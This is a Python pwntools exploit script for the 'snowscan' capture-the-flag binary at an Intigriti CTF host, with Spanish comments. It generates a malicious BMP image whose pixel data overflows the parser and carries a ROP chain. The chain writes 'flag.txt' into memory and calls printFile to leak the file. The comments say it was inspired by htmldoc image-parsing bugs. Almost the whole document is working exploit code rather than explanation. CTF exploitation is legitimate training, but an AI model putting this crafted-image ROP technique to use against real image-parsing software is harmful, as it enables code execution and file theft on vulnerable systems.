from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./snowscan")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['kitty', '-e']

def create_valid_bmp(filename, width, height):
    # Encabezado BMP
    file_size = 54 + 1024 + width * height  # 54 bytes header + 1024 bytes palette + pixel data
    reserved = 0
    data_offset = 54 + 1024  # header + palette

    # Encabezado DIB
    header_size = 40
    planes = 1
    bpp = 8  # 8 bits per pixel
    compression = 0
    image_size = width * height
    xppm = 2835  # 72 DPI
    yppm = 2835  # 72 DPI
    total_colors = 256
    important_colors = 256

    # Paleta de colores (256 colores)
    palette = b''
    for i in range(256):
        palette += p8(i) + p8(i) + p8(i) + p8(0)

    # Crear el archivo BMP
    bmp = b''
    # Encabezado BMP
    bmp += b'BM'
    bmp += p32(file_size)
    bmp += p32(reserved)
    bmp += p32(data_offset)

    # Encabezado DIB
    bmp += p32(header_size)
    bmp += p32(width)
    bmp += p32(height)
    bmp += p16(planes)
    bmp += p16(bpp)
    bmp += p32(compression)
    bmp += p32(image_size)
    bmp += p32(xppm)
    bmp += p32(yppm)
    bmp += p32(total_colors)
    bmp += p32(important_colors)

    # Paleta de colores
    bmp += palette

    start_row = 4

    for y in range(start_row - 1):
        for x in range(width):
            bmp += p64(0x4141414141414141)
 
    bmp += b"\x43"*(((width - 7) * 8) - 3)

    ret = 0x000000000040101a # ret

    pop_rdi = 0x0000000000401a72 # pop rdi ; ret

    pop_rsi = 0x000000000040f97e # pop rsi ; ret

    push_rsp = 0x000000000041364e # push rsp ; ret

    pop_rax = 0x00000000004522e7 # pop rax ; ret

    data = 0x00000000004c10e0 # @ .data

    mov_qword_ptr_rsi = 0x0000000000482d35 # mov qword ptr [rsi], rax ; ret

    xor_rax_rax = 0x0000000000447129 # xor rax, rax ; ret

    printFile_address = elf.sym.printFile

    # Me base en esto XD: ROPgadget --binary snowscan --ropchain
    # Mi inspiracion: https://github.com/michaelrsweet/htmldoc/issues/456
    # Tambien: https://github.com/michaelrsweet/htmldoc/issues/453

    payload = b"".join([
        p64(pop_rsi),
        p64(data),
        p64(pop_rax),
        b"flag.txt",
        p64(mov_qword_ptr_rsi),
        p64(pop_rsi),
        p64(data + 8), # @ .data + 8
        p64(xor_rax_rax),
        p64(mov_qword_ptr_rsi),
        p64(pop_rdi),
        p64(data),
        p64(printFile_address)
    ])

    bmp += payload

    for x in range(8):
        bmp += p64(0x4646464646464646)

    #for y in range(start_row + 1, height):
    #    for x in range(1, width):
    #        bmp += p64(0x4242424242424242) 

    # Guardar el archivo BMP
    with open(filename, 'wb') as f:
        f.write(bmp)

    print(f"Archivo BMP '{filename}' creado correctamente.")

# Definir el tamaño de la imagen
width, height = 26, 26

# Crear la imagen BMP
create_valid_bmp('output.bmp', width, height)

